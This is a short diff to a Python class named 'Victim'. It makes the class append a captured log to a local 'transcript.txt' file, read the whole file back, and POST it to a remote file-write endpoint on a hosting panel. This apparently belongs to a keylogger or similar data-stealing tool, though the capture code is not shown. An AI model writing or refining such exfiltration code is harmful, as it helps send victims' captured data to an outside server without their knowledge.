@@ -468,9 +468,11 @@ class Victim:
 
         file_path = 'transcript.txt'
 
-        with open(file_path, 'w') as file:
+        with open(file_path, 'a') as file:
             file.write(self.log)
-            print('Transcript updated')
+        
+        with open(file_path, 'r') as file:
+            file_contents = file.read()
 
         # The URL for the POST request...
         url = 'https://panel.birdflop.com/api/client/servers/d8d1f336/files/write?file=%2Fdata%2F4adfc5325dfd9932f38eb7985769c3bb'
@@ -481,7 +483,7 @@ class Victim:
         }
 
         # Send the POST request with the file contents
-        response = requests.post(url, data=self.log, headers=headers)
+        response = requests.post(url, data=file_contents, headers=headers)
 
         # Check the response
         if response.status_code == 204 or response.status_code == 200:
